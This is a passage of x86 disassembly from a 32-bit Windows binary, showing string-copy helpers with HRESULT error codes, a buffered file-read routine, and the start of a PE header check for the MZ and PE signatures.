  4024e2:	8b c3                	mov    %ebx,%eax
  4024e4:	f7 d8                	neg    %eax
  4024e6:	1b c0                	sbb    %eax,%eax
  4024e8:	83 e0 23             	and    $0x23,%eax
  4024eb:	05 57 00 07 80       	add    $0x80070057,%eax
  4024f0:	eb 1f                	jmp    0x402511
  4024f2:	52                   	push   %edx
  4024f3:	8d 44 24 14          	lea    0x14(%esp),%eax
  4024f7:	50                   	push   %eax
  4024f8:	8b d3                	mov    %ebx,%edx
  4024fa:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  402501:	00 
  402502:	e8 79 00 00 00       	call   0x402580
  402507:	8b ce                	mov    %esi,%ecx
  402509:	2b 4c 24 10          	sub    0x10(%esp),%ecx
  40250d:	85 c0                	test   %eax,%eax
  40250f:	7d 1a                	jge    0x40252b
  402511:	85 ff                	test   %edi,%edi
  402513:	74 0b                	je     0x402520
  402515:	85 f6                	test   %esi,%esi
  402517:	76 07                	jbe    0x402520
  402519:	33 d2                	xor    %edx,%edx
  40251b:	8b ce                	mov    %esi,%ecx
  40251d:	66 89 13             	mov    %dx,(%ebx)
  402520:	85 c0                	test   %eax,%eax
  402522:	7d 07                	jge    0x40252b
  402524:	3d 7a 00 07 80       	cmp    $0x8007007a,%eax
  402529:	75 0d                	jne    0x402538
  40252b:	85 ed                	test   %ebp,%ebp
  40252d:	74 09                	je     0x402538
  40252f:	83 e7 01             	and    $0x1,%edi
  402532:	8d 0c 4f             	lea    (%edi,%ecx,2),%ecx
  402535:	89 4d 00             	mov    %ecx,0x0(%ebp)
  402538:	5f                   	pop    %edi
  402539:	5e                   	pop    %esi
  40253a:	5d                   	pop    %ebp
  40253b:	c2 04 00             	ret    $0x4
  40253e:	cc                   	int3
  40253f:	cc                   	int3
  402540:	33 c0                	xor    %eax,%eax
  402542:	56                   	push   %esi
  402543:	8b f1                	mov    %ecx,%esi
  402545:	85 c9                	test   %ecx,%ecx
  402547:	74 17                	je     0x402560
  402549:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  402550:	38 02                	cmp    %al,(%edx)
  402552:	74 08                	je     0x40255c
  402554:	42                   	inc    %edx
  402555:	83 e9 01             	sub    $0x1,%ecx
  402558:	75 f6                	jne    0x402550
  40255a:	eb 04                	jmp    0x402560
  40255c:	85 c9                	test   %ecx,%ecx
  40255e:	75 05                	jne    0x402565
  402560:	b8 57 00 07 80       	mov    $0x80070057,%eax
  402565:	85 ff                	test   %edi,%edi
  402567:	74 10                	je     0x402579
  402569:	85 c0                	test   %eax,%eax
  40256b:	7c 06                	jl     0x402573
  40256d:	2b f1                	sub    %ecx,%esi
  40256f:	89 37                	mov    %esi,(%edi)
  402571:	5e                   	pop    %esi
  402572:	c3                   	ret
  402573:	c7 07 00 00 00 00    	movl   $0x0,(%edi)
  402579:	5e                   	pop    %esi
  40257a:	c3                   	ret
  40257b:	cc                   	int3
  40257c:	cc                   	int3
  40257d:	cc                   	int3
  40257e:	cc                   	int3
  40257f:	cc                   	int3
  402580:	53                   	push   %ebx
  402581:	55                   	push   %ebp
  402582:	8b 6c 24 10          	mov    0x10(%esp),%ebp
  402586:	56                   	push   %esi
  402587:	33 c0                	xor    %eax,%eax
  402589:	33 db                	xor    %ebx,%ebx
  40258b:	57                   	push   %edi
  40258c:	bf fe ff ff 7f       	mov    $0x7ffffffe,%edi
  402591:	85 c9                	test   %ecx,%ecx
  402593:	74 23                	je     0x4025b8
  402595:	85 ff                	test   %edi,%edi
  402597:	74 1b                	je     0x4025b4
  402599:	0f b7 75 00          	movzwl 0x0(%ebp),%esi
  40259d:	66 85 f6             	test   %si,%si
  4025a0:	74 12                	je     0x4025b4
  4025a2:	66 89 32             	mov    %si,(%edx)
  4025a5:	49                   	dec    %ecx
  4025a6:	83 c2 02             	add    $0x2,%edx
  4025a9:	83 c5 02             	add    $0x2,%ebp
  4025ac:	4f                   	dec    %edi
  4025ad:	43                   	inc    %ebx
  4025ae:	85 c9                	test   %ecx,%ecx
  4025b0:	75 e3                	jne    0x402595
  4025b2:	eb 04                	jmp    0x4025b8
  4025b4:	85 c9                	test   %ecx,%ecx
  4025b6:	75 09                	jne    0x4025c1
  4025b8:	83 ea 02             	sub    $0x2,%edx
  4025bb:	4b                   	dec    %ebx
  4025bc:	b8 7a 00 07 80       	mov    $0x8007007a,%eax
  4025c1:	33 c9                	xor    %ecx,%ecx
  4025c3:	66 89 0a             	mov    %cx,(%edx)
  4025c6:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  4025ca:	85 c9                	test   %ecx,%ecx
  4025cc:	74 02                	je     0x4025d0
  4025ce:	89 19                	mov    %ebx,(%ecx)
  4025d0:	5f                   	pop    %edi
  4025d1:	5e                   	pop    %esi
  4025d2:	5d                   	pop    %ebp
  4025d3:	5b                   	pop    %ebx
  4025d4:	c2 08 00             	ret    $0x8
  4025d7:	cc                   	int3
  4025d8:	cc                   	int3
  4025d9:	cc                   	int3
  4025da:	cc                   	int3
  4025db:	cc                   	int3
  4025dc:	cc                   	int3
  4025dd:	cc                   	int3
  4025de:	cc                   	int3
  4025df:	cc                   	int3
  4025e0:	33 c0                	xor    %eax,%eax
  4025e2:	85 c9                	test   %ecx,%ecx
  4025e4:	74 08                	je     0x4025ee
  4025e6:	81 f9 ff ff ff 7f    	cmp    $0x7fffffff,%ecx
  4025ec:	76 05                	jbe    0x4025f3
  4025ee:	b8 57 00 07 80       	mov    $0x80070057,%eax
  4025f3:	57                   	push   %edi
  4025f4:	8b f8                	mov    %eax,%edi
  4025f6:	85 c0                	test   %eax,%eax
  4025f8:	7c 3c                	jl     0x402636
  4025fa:	56                   	push   %esi
  4025fb:	8d 71 ff             	lea    -0x1(%ecx),%esi
  4025fe:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  402602:	8d 44 24 10          	lea    0x10(%esp),%eax
  402606:	50                   	push   %eax
  402607:	51                   	push   %ecx
  402608:	56                   	push   %esi
  402609:	53                   	push   %ebx
  40260a:	33 ff                	xor    %edi,%edi
  40260c:	e8 f9 7d 00 00       	call   0x40a40a
  402611:	83 c4 10             	add    $0x10,%esp
  402614:	85 c0                	test   %eax,%eax
  402616:	7c 14                	jl     0x40262c
  402618:	3b c6                	cmp    %esi,%eax
  40261a:	77 10                	ja     0x40262c
  40261c:	75 17                	jne    0x402635
  40261e:	33 c0                	xor    %eax,%eax
  402620:	c6 04 1e 00          	movb   $0x0,(%esi,%ebx,1)
  402624:	85 ff                	test   %edi,%edi
  402626:	5e                   	pop    %esi
  402627:	0f 94 c0             	sete   %al
  40262a:	5f                   	pop    %edi
  40262b:	c3                   	ret
  40262c:	bf 7a 00 07 80       	mov    $0x8007007a,%edi
  402631:	c6 04 1e 00          	movb   $0x0,(%esi,%ebx,1)
  402635:	5e                   	pop    %esi
  402636:	33 c0                	xor    %eax,%eax
  402638:	85 ff                	test   %edi,%edi
  40263a:	0f 94 c0             	sete   %al
  40263d:	5f                   	pop    %edi
  40263e:	c3                   	ret
  40263f:	cc                   	int3
  402640:	51                   	push   %ecx
  402641:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402648:	85 d2                	test   %edx,%edx
  40264a:	74 15                	je     0x402661
  40264c:	81 f9 ff ff ff 7f    	cmp    $0x7fffffff,%ecx
  402652:	77 0d                	ja     0x402661
  402654:	57                   	push   %edi
  402655:	8d 7c 24 04          	lea    0x4(%esp),%edi
  402659:	e8 e2 fe ff ff       	call   0x402540
  40265e:	5f                   	pop    %edi
  40265f:	eb 05                	jmp    0x402666
  402661:	b8 57 00 07 80       	mov    $0x80070057,%eax
  402666:	85 f6                	test   %esi,%esi
  402668:	74 0d                	je     0x402677
  40266a:	33 c9                	xor    %ecx,%ecx
  40266c:	85 c0                	test   %eax,%eax
  40266e:	0f 9c c1             	setl   %cl
  402671:	49                   	dec    %ecx
  402672:	23 0c 24             	and    (%esp),%ecx
  402675:	89 0e                	mov    %ecx,(%esi)
  402677:	33 d2                	xor    %edx,%edx
  402679:	85 c0                	test   %eax,%eax
  40267b:	0f 94 c2             	sete   %dl
  40267e:	8b c2                	mov    %edx,%eax
  402680:	59                   	pop    %ecx
  402681:	c3                   	ret
  402682:	cc                   	int3
  402683:	cc                   	int3
  402684:	cc                   	int3
  402685:	cc                   	int3
  402686:	cc                   	int3
  402687:	cc                   	int3
  402688:	cc                   	int3
  402689:	cc                   	int3
  40268a:	cc                   	int3
  40268b:	cc                   	int3
  40268c:	cc                   	int3
  40268d:	cc                   	int3
  40268e:	cc                   	int3
  40268f:	cc                   	int3
  402690:	56                   	push   %esi
  402691:	50                   	push   %eax
  402692:	e8 5a 85 00 00       	call   0x40abf1
  402697:	8b f0                	mov    %eax,%esi
  402699:	83 c4 04             	add    $0x4,%esp
  40269c:	85 f6                	test   %esi,%esi
  40269e:	75 0a                	jne    0x4026aa
  4026a0:	6a 08                	push   $0x8
  4026a2:	ff 15 a8 80 41 00    	call   *0x4180a8
  4026a8:	8b c6                	mov    %esi,%eax
  4026aa:	5e                   	pop    %esi
  4026ab:	c3                   	ret
  4026ac:	cc                   	int3
  4026ad:	cc                   	int3
  4026ae:	cc                   	int3
  4026af:	cc                   	int3
  4026b0:	83 ec 20             	sub    $0x20,%esp
  4026b3:	33 c0                	xor    %eax,%eax
  4026b5:	89 44 24 10          	mov    %eax,0x10(%esp)
  4026b9:	89 44 24 14          	mov    %eax,0x14(%esp)
  4026bd:	89 44 24 18          	mov    %eax,0x18(%esp)
  4026c1:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4026c5:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  4026c9:	50                   	push   %eax
  4026ca:	8d 4c 24 1e          	lea    0x1e(%esp),%ecx
  4026ce:	51                   	push   %ecx
  4026cf:	8d 54 24 20          	lea    0x20(%esp),%edx
  4026d3:	52                   	push   %edx
  4026d4:	8d 44 24 22          	lea    0x22(%esp),%eax
  4026d8:	50                   	push   %eax
  4026d9:	8b 44 24 34          	mov    0x34(%esp),%eax
  4026dd:	8d 4c 24 22          	lea    0x22(%esp),%ecx
  4026e1:	51                   	push   %ecx
  4026e2:	8d 54 24 24          	lea    0x24(%esp),%edx
  4026e6:	52                   	push   %edx
  4026e7:	68 14 aa 41 00       	push   $0x41aa14
  4026ec:	50                   	push   %eax
  4026ed:	e8 43 7c 00 00       	call   0x40a335
  4026f2:	83 c4 20             	add    $0x20,%esp
  4026f5:	83 f8 03             	cmp    $0x3,%eax
  4026f8:	74 0b                	je     0x402705
  4026fa:	83 f8 06             	cmp    $0x6,%eax
  4026fd:	74 06                	je     0x402705
  4026ff:	33 c0                	xor    %eax,%eax
  402701:	83 c4 20             	add    $0x20,%esp
  402704:	c3                   	ret
  402705:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  402709:	51                   	push   %ecx
  40270a:	8d 54 24 14          	lea    0x14(%esp),%edx
  40270e:	52                   	push   %edx
  40270f:	ff 15 7c 80 41 00    	call   *0x41807c
  402715:	85 c0                	test   %eax,%eax
  402717:	74 e6                	je     0x4026ff
  402719:	8d 04 24             	lea    (%esp),%eax
  40271c:	50                   	push   %eax
  40271d:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  402721:	51                   	push   %ecx
  402722:	ff 15 84 80 41 00    	call   *0x418084
  402728:	85 c0                	test   %eax,%eax
  40272a:	74 d3                	je     0x4026ff
  40272c:	8b 44 24 04          	mov    0x4(%esp),%eax
  402730:	8b 14 24             	mov    (%esp),%edx
  402733:	89 46 04             	mov    %eax,0x4(%esi)
  402736:	89 16                	mov    %edx,(%esi)
  402738:	b8 01 00 00 00       	mov    $0x1,%eax
  40273d:	83 c4 20             	add    $0x20,%esp
  402740:	c3                   	ret
  402741:	cc                   	int3
  402742:	cc                   	int3
  402743:	cc                   	int3
  402744:	cc                   	int3
  402745:	cc                   	int3
  402746:	cc                   	int3
  402747:	cc                   	int3
  402748:	cc                   	int3
  402749:	cc                   	int3
  40274a:	cc                   	int3
  40274b:	cc                   	int3
  40274c:	cc                   	int3
  40274d:	cc                   	int3
  40274e:	cc                   	int3
  40274f:	cc                   	int3
  402750:	51                   	push   %ecx
  402751:	6a 00                	push   $0x0
  402753:	8d 44 24 04          	lea    0x4(%esp),%eax
  402757:	50                   	push   %eax
  402758:	56                   	push   %esi
  402759:	51                   	push   %ecx
  40275a:	52                   	push   %edx
  40275b:	ff 15 90 80 41 00    	call   *0x418090
  402761:	85 c0                	test   %eax,%eax
  402763:	75 1d                	jne    0x402782
  402765:	68 90 aa 41 00       	push   $0x41aa90
  40276a:	68 fc 00 00 00       	push   $0xfc
  40276f:	68 70 aa 41 00       	push   $0x41aa70
  402774:	33 d2                	xor    %edx,%edx
  402776:	e8 95 3a 00 00       	call   0x406210
  40277b:	83 c4 0c             	add    $0xc,%esp
  40277e:	33 c0                	xor    %eax,%eax
  402780:	59                   	pop    %ecx
  402781:	c3                   	ret
  402782:	3b 34 24             	cmp    (%esp),%esi
  402785:	74 20                	je     0x4027a7
  402787:	68 ac aa 41 00       	push   $0x41aaac
  40278c:	68 fe 00 00 00       	push   $0xfe
  402791:	68 70 aa 41 00       	push   $0x41aa70
  402796:	ba 01 00 00 00       	mov    $0x1,%edx
  40279b:	e8 a0 3b 00 00       	call   0x406340
  4027a0:	83 c4 0c             	add    $0xc,%esp
  4027a3:	33 c0                	xor    %eax,%eax
  4027a5:	59                   	pop    %ecx
  4027a6:	c3                   	ret
  4027a7:	b8 01 00 00 00       	mov    $0x1,%eax
  4027ac:	59                   	pop    %ecx
  4027ad:	c3                   	ret
  4027ae:	cc                   	int3
  4027af:	cc                   	int3
  4027b0:	83 ec 18             	sub    $0x18,%esp
  4027b3:	8b 57 18             	mov    0x18(%edi),%edx
  4027b6:	53                   	push   %ebx
  4027b7:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  4027bb:	55                   	push   %ebp
  4027bc:	8b 6c 24 30          	mov    0x30(%esp),%ebp
  4027c0:	8b c5                	mov    %ebp,%eax
  4027c2:	03 c3                	add    %ebx,%eax
  4027c4:	b9 00 00 00 00       	mov    $0x0,%ecx
  4027c9:	13 4c 24 28          	adc    0x28(%esp),%ecx
  4027cd:	56                   	push   %esi
  4027ce:	8b 77 10             	mov    0x10(%edi),%esi
  4027d1:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  4027d5:	89 4f 0c             	mov    %ecx,0xc(%edi)
  4027d8:	89 47 08             	mov    %eax,0x8(%edi)
  4027db:	89 44 24 0c          	mov    %eax,0xc(%esp)
  4027df:	33 c0                	xor    %eax,%eax
  4027e1:	8b ca                	mov    %edx,%ecx
  4027e3:	03 ce                	add    %esi,%ecx
  4027e5:	13 47 14             	adc    0x14(%edi),%eax
  4027e8:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  4027ec:	8b 4f 20             	mov    0x20(%edi),%ecx
  4027ef:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  4027f3:	8b 4f 24             	mov    0x24(%edi),%ecx
  4027f6:	39 4c 24 10          	cmp    %ecx,0x10(%esp)
  4027fa:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  4027fe:	7c 31                	jl     0x402831
  402800:	7f 0a                	jg     0x40280c
  402802:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  402806:	39 4c 24 0c          	cmp    %ecx,0xc(%esp)
  40280a:	76 25                	jbe    0x402831
  40280c:	68 e0 aa 41 00       	push   $0x41aae0
  402811:	68 bd 01 00 00       	push   $0x1bd
  402816:	68 70 aa 41 00       	push   $0x41aa70
  40281b:	ba 01 00 00 00       	mov    $0x1,%edx
  402820:	e8 1b 3b 00 00       	call   0x406340
  402825:	83 c4 0c             	add    $0xc,%esp
  402828:	33 c0                	xor    %eax,%eax
  40282a:	5e                   	pop    %esi
  40282b:	5d                   	pop    %ebp
  40282c:	5b                   	pop    %ebx
  40282d:	83 c4 18             	add    $0x18,%esp
  402830:	c3                   	ret
  402831:	8b 4f 14             	mov    0x14(%edi),%ecx
  402834:	8b 74 24 2c          	mov    0x2c(%esp),%esi
  402838:	3b f1                	cmp    %ecx,%esi
  40283a:	7f 57                	jg     0x402893
  40283c:	7c 05                	jl     0x402843
  40283e:	3b 5f 10             	cmp    0x10(%edi),%ebx
  402841:	73 50                	jae    0x402893
  402843:	39 4c 24 10          	cmp    %ecx,0x10(%esp)
  402847:	0f 8c b5 00 00 00    	jl     0x402902
  40284d:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  402851:	7f 0b                	jg     0x40285e
  402853:	8b 57 10             	mov    0x10(%edi),%edx
  402856:	3b ca                	cmp    %edx,%ecx
  402858:	0f 86 a4 00 00 00    	jbe    0x402902
  40285e:	39 44 24 10          	cmp    %eax,0x10(%esp)
  402862:	0f 8f 9a 00 00 00    	jg     0x402902
  402868:	7c 0a                	jl     0x402874
  40286a:	3b 4c 24 1c          	cmp    0x1c(%esp),%ecx
  40286e:	0f 87 8e 00 00 00    	ja     0x402902
  402874:	8b 47 10             	mov    0x10(%edi),%eax
  402877:	8b 57 28             	mov    0x28(%edi),%edx
  40287a:	8b e8                	mov    %eax,%ebp
  40287c:	2b c8                	sub    %eax,%ecx
  40287e:	8b 44 24 30          	mov    0x30(%esp),%eax
  402882:	51                   	push   %ecx
  402883:	2b eb                	sub    %ebx,%ebp
  402885:	52                   	push   %edx
  402886:	03 c5                	add    %ebp,%eax
  402888:	50                   	push   %eax
  402889:	e8 c2 73 00 00       	call   0x409c50
  40288e:	83 c4 0c             	add    $0xc,%esp
  402891:	eb 6f                	jmp    0x402902
  402893:	3b f0                	cmp    %eax,%esi
  402895:	7f 6b                	jg     0x402902
  402897:	7c 06                	jl     0x40289f
  402899:	3b 5c 24 1c          	cmp    0x1c(%esp),%ebx
  40289d:	73 63                	jae    0x402902
  40289f:	39 44 24 10          	cmp    %eax,0x10(%esp)
  4028a3:	7f 2f                	jg     0x4028d4
  4028a5:	7c 0a                	jl     0x4028b1
  4028a7:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  4028ab:	39 4c 24 0c          	cmp    %ecx,0xc(%esp)
  4028af:	77 23                	ja     0x4028d4
  4028b1:	8b 57 28             	mov    0x28(%edi),%edx
  4028b4:	2b 57 10             	sub    0x10(%edi),%edx
  4028b7:	8b 44 24 30          	mov    0x30(%esp),%eax
  4028bb:	55                   	push   %ebp
  4028bc:	03 d3                	add    %ebx,%edx
  4028be:	52                   	push   %edx
  4028bf:	50                   	push   %eax
  4028c0:	e8 8b 73 00 00       	call   0x409c50
  4028c5:	83 c4 0c             	add    $0xc,%esp
  4028c8:	b8 01 00 00 00       	mov    $0x1,%eax
  4028cd:	5e                   	pop    %esi
  4028ce:	5d                   	pop    %ebp
  4028cf:	5b                   	pop    %ebx
  4028d0:	83 c4 18             	add    $0x18,%esp
  4028d3:	c3                   	ret
  4028d4:	8b 4f 28             	mov    0x28(%edi),%ecx
  4028d7:	8b c3                	mov    %ebx,%eax
  4028d9:	2b 47 10             	sub    0x10(%edi),%eax
  4028dc:	2b d0                	sub    %eax,%edx
  4028de:	8b f2                	mov    %edx,%esi
  4028e0:	8b 54 24 30          	mov    0x30(%esp),%edx
  4028e4:	56                   	push   %esi
  4028e5:	03 c8                	add    %eax,%ecx
  4028e7:	51                   	push   %ecx
  4028e8:	52                   	push   %edx
  4028e9:	e8 62 73 00 00       	call   0x409c50
  4028ee:	01 74 24 3c          	add    %esi,0x3c(%esp)
  4028f2:	83 c4 0c             	add    $0xc,%esp
  4028f5:	03 de                	add    %esi,%ebx
  4028f7:	83 54 24 2c 00       	adcl   $0x0,0x2c(%esp)
  4028fc:	2b ee                	sub    %esi,%ebp
  4028fe:	8b 74 24 2c          	mov    0x2c(%esp),%esi
  402902:	8b 4f 2c             	mov    0x2c(%edi),%ecx
  402905:	33 d2                	xor    %edx,%edx
  402907:	8b c5                	mov    %ebp,%eax
  402909:	f7 f1                	div    %ecx
  40290b:	85 c0                	test   %eax,%eax
  40290d:	0f 84 88 00 00 00    	je     0x40299b
  402913:	8b 07                	mov    (%edi),%eax
  402915:	6a 00                	push   $0x0
  402917:	6a 00                	push   $0x0
  402919:	56                   	push   %esi
  40291a:	53                   	push   %ebx
  40291b:	50                   	push   %eax
  40291c:	89 44 24 48          	mov    %eax,0x48(%esp)
  402920:	ff 15 88 80 41 00    	call   *0x418088
  402926:	85 c0                	test   %eax,%eax
  402928:	75 22                	jne    0x40294c
  40292a:	68 44 aa 41 00       	push   $0x41aa44
  40292f:	68 f9 00 00 00       	push   $0xf9
  402934:	68 70 aa 41 00       	push   $0x41aa70
  402939:	33 d2                	xor    %edx,%edx
  40293b:	e8 d0 38 00 00       	call   0x406210
  402940:	83 c4 0c             	add    $0xc,%esp
  402943:	33 c0                	xor    %eax,%eax
  402945:	5e                   	pop    %esi
  402946:	5d                   	pop    %ebp
  402947:	5b                   	pop    %ebx
  402948:	83 c4 18             	add    $0x18,%esp
  40294b:	c3                   	ret
  40294c:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  402950:	8b 54 24 34          	mov    0x34(%esp),%edx
  402954:	8b f5                	mov    %ebp,%esi
  402956:	e8 f5 fd ff ff       	call   0x402750
  40295b:	85 c0                	test   %eax,%eax
  40295d:	0f 84 90 00 00 00    	je     0x4029f3
  402963:	8b 77 2c             	mov    0x2c(%edi),%esi
  402966:	8b 54 24 30          	mov    0x30(%esp),%edx
  40296a:	2b ee                	sub    %esi,%ebp
  40296c:	33 c9                	xor    %ecx,%ecx
  40296e:	8b c5                	mov    %ebp,%eax
  402970:	03 c3                	add    %ebx,%eax
  402972:	13 4c 24 2c          	adc    0x2c(%esp),%ecx
  402976:	56                   	push   %esi
  402977:	03 d5                	add    %ebp,%edx
  402979:	89 47 10             	mov    %eax,0x10(%edi)
  40297c:	8b 47 28             	mov    0x28(%edi),%eax
  40297f:	52                   	push   %edx
  402980:	50                   	push   %eax
  402981:	89 4f 14             	mov    %ecx,0x14(%edi)
  402984:	e8 c7 72 00 00       	call   0x409c50
  402989:	89 77 18             	mov    %esi,0x18(%edi)
  40298c:	83 c4 0c             	add    $0xc,%esp
  40298f:	b8 01 00 00 00       	mov    $0x1,%eax
  402994:	5e                   	pop    %esi
  402995:	5d                   	pop    %ebp
  402996:	5b                   	pop    %ebx
  402997:	83 c4 18             	add    $0x18,%esp
  40299a:	c3                   	ret
  40299b:	8b 44 24 14          	mov    0x14(%esp),%eax
  40299f:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  4029a3:	2b c3                	sub    %ebx,%eax
  4029a5:	1b ce                	sbb    %esi,%ecx
  4029a7:	33 d2                	xor    %edx,%edx
  4029a9:	3b ca                	cmp    %edx,%ecx
  4029ab:	7c 0a                	jl     0x4029b7
  4029ad:	7f 05                	jg     0x4029b4
  4029af:	3b 47 2c             	cmp    0x2c(%edi),%eax
  4029b2:	72 03                	jb     0x4029b7
  4029b4:	8b 47 2c             	mov    0x2c(%edi),%eax
  4029b7:	8b 54 24 2c          	mov    0x2c(%esp),%edx
  4029bb:	8b 4f 28             	mov    0x28(%edi),%ecx
  4029be:	6a 00                	push   $0x0
  4029c0:	6a 00                	push   $0x0
  4029c2:	52                   	push   %edx
  4029c3:	89 47 18             	mov    %eax,0x18(%edi)
  4029c6:	8b f0                	mov    %eax,%esi
  4029c8:	8b 07                	mov    (%edi),%eax
  4029ca:	53                   	push   %ebx
  4029cb:	50                   	push   %eax
  4029cc:	89 4c 24 48          	mov    %ecx,0x48(%esp)
  4029d0:	89 44 24 20          	mov    %eax,0x20(%esp)
  4029d4:	ff 15 88 80 41 00    	call   *0x418088
  4029da:	85 c0                	test   %eax,%eax
  4029dc:	0f 84 48 ff ff ff    	je     0x40292a
  4029e2:	8b 4c 24 34          	mov    0x34(%esp),%ecx
  4029e6:	8b 54 24 0c          	mov    0xc(%esp),%edx
  4029ea:	e8 61 fd ff ff       	call   0x402750
  4029ef:	85 c0                	test   %eax,%eax
  4029f1:	75 09                	jne    0x4029fc
  4029f3:	33 c0                	xor    %eax,%eax
  4029f5:	5e                   	pop    %esi
  4029f6:	5d                   	pop    %ebp
  4029f7:	5b                   	pop    %ebx
  4029f8:	83 c4 18             	add    $0x18,%esp
  4029fb:	c3                   	ret
  4029fc:	8b 4f 28             	mov    0x28(%edi),%ecx
  4029ff:	8b 54 24 30          	mov    0x30(%esp),%edx
  402a03:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  402a07:	55                   	push   %ebp
  402a08:	51                   	push   %ecx
  402a09:	52                   	push   %edx
  402a0a:	89 5f 10             	mov    %ebx,0x10(%edi)
  402a0d:	89 47 14             	mov    %eax,0x14(%edi)
  402a10:	e8 3b 72 00 00       	call   0x409c50
  402a15:	83 c4 0c             	add    $0xc,%esp
  402a18:	5e                   	pop    %esi
  402a19:	5d                   	pop    %ebp
  402a1a:	b8 01 00 00 00       	mov    $0x1,%eax
  402a1f:	5b                   	pop    %ebx
  402a20:	83 c4 18             	add    $0x18,%esp
  402a23:	c3                   	ret
  402a24:	cc                   	int3
  402a25:	cc                   	int3
  402a26:	cc                   	int3
  402a27:	cc                   	int3
  402a28:	cc                   	int3
  402a29:	cc                   	int3
  402a2a:	cc                   	int3
  402a2b:	cc                   	int3
  402a2c:	cc                   	int3
  402a2d:	cc                   	int3
  402a2e:	cc                   	int3
  402a2f:	cc                   	int3
  402a30:	83 ec 58             	sub    $0x58,%esp
  402a33:	53                   	push   %ebx
  402a34:	55                   	push   %ebp
  402a35:	8b 6c 24 64          	mov    0x64(%esp),%ebp
  402a39:	56                   	push   %esi
  402a3a:	57                   	push   %edi
  402a3b:	33 ff                	xor    %edi,%edi
  402a3d:	6a 30                	push   $0x30
  402a3f:	8b d8                	mov    %eax,%ebx
  402a41:	8d 44 24 3c          	lea    0x3c(%esp),%eax
  402a45:	57                   	push   %edi
  402a46:	50                   	push   %eax
  402a47:	8b f1                	mov    %ecx,%esi
  402a49:	89 7c 24 28          	mov    %edi,0x28(%esp)
  402a4d:	89 7c 24 24          	mov    %edi,0x24(%esp)
  402a51:	e8 3a 65 00 00       	call   0x408f90
  402a56:	83 c4 0c             	add    $0xc,%esp
  402a59:	8d 4c 24 58          	lea    0x58(%esp),%ecx
  402a5d:	51                   	push   %ecx
  402a5e:	56                   	push   %esi
  402a5f:	89 74 24 40          	mov    %esi,0x40(%esp)
  402a63:	ff 15 94 80 41 00    	call   *0x418094
  402a69:	85 c0                	test   %eax,%eax
  402a6b:	75 1b                	jne    0x402a88
  402a6d:	68 bc aa 41 00       	push   $0x41aabc
  402a72:	68 1e 01 00 00       	push   $0x11e
  402a77:	68 70 aa 41 00       	push   $0x41aa70
  402a7c:	33 d2                	xor    %edx,%edx
  402a7e:	e8 8d 37 00 00       	call   0x406210
  402a83:	e9 d9 04 00 00       	jmp    0x402f61
  402a88:	68 00 40 00 00       	push   $0x4000
  402a8d:	c7 44 24 68 00 40 00 	movl   $0x4000,0x68(%esp)
  402a94:	00 
  402a95:	e8 57 81 00 00       	call   0x40abf1
  402a9a:	8b f0                	mov    %eax,%esi
  402a9c:	83 c4 04             	add    $0x4,%esp
  402a9f:	3b f7                	cmp    %edi,%esi
  402aa1:	75 08                	jne    0x402aab
  402aa3:	6a 08                	push   $0x8
  402aa5:	ff 15 a8 80 41 00    	call   *0x4180a8
  402aab:	89 74 24 60          	mov    %esi,0x60(%esp)
  402aaf:	3b f7                	cmp    %edi,%esi
  402ab1:	75 1b                	jne    0x402ace
  402ab3:	68 dc a8 41 00       	push   $0x41a8dc
  402ab8:	68 23 02 00 00       	push   $0x223
  402abd:	68 70 aa 41 00       	push   $0x41aa70
  402ac2:	33 d2                	xor    %edx,%edx
  402ac4:	e8 47 37 00 00       	call   0x406210
  402ac9:	e9 93 04 00 00       	jmp    0x402f61
  402ace:	6a 40                	push   $0x40
  402ad0:	53                   	push   %ebx
  402ad1:	57                   	push   %edi
  402ad2:	57                   	push   %edi
  402ad3:	8d 7c 24 48          	lea    0x48(%esp),%edi
  402ad7:	e8 d4 fc ff ff       	call   0x4027b0
  402adc:	83 c4 10             	add    $0x10,%esp
  402adf:	85 c0                	test   %eax,%eax
  402ae1:	0f 84 7d 04 00 00    	je     0x402f64
  402ae7:	ba 4d 5a 00 00       	mov    $0x5a4d,%edx
  402aec:	66 39 13             	cmp    %dx,(%ebx)
  402aef:	0f 85 53 04 00 00    	jne    0x402f48
  402af5:	8b 43 3c             	mov    0x3c(%ebx),%eax
  402af8:	85 c0                	test   %eax,%eax
  402afa:	0f 8e 48 04 00 00    	jle    0x402f48
  402b00:	6a 04                	push   $0x4
  402b02:	99                   	cltd
  402b03:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  402b07:	51                   	push   %ecx
  402b08:	52                   	push   %edx
  402b09:	50                   	push   %eax
  402b0a:	e8 a1 fc ff ff       	call   0x4027b0
  402b0f:	83 c4 10             	add    $0x10,%esp
  402b12:	85 c0                	test   %eax,%eax
  402b14:	0f 84 4a 04 00 00    	je     0x402f64
  402b1a:	81 7c 24 2c 50 45 00 	cmpl   $0x4550,0x2c(%esp)
  402b21:	00 
  402b22:	74 0f                	je     0x402b33
  402b24:	68 ec aa 41 00       	push   $0x41aaec
  402b29:	68 2e 02 00 00       	push   $0x22e
  402b2e:	e9 1f 04 00 00       	jmp    0x402f52
  402b33:	8b 43 3c             	mov    0x3c(%ebx),%eax
  402b36:	33 c9                	xor    %ecx,%ecx
  402b38:	8d 70 04             	lea    0x4(%eax),%esi
  402b3b:	89 4c 24 34          	mov    %ecx,0x34(%esp)
  402b3f:	89 8d a0 00 00 00    	mov    %ecx,0xa0(%ebp)
  402b45:	3d 10 01 00 00       	cmp    $0x110,%eax
  402b4a:	72 32                	jb     0x402b7e
  402b4c:	68 90 00 00 00       	push   $0x90
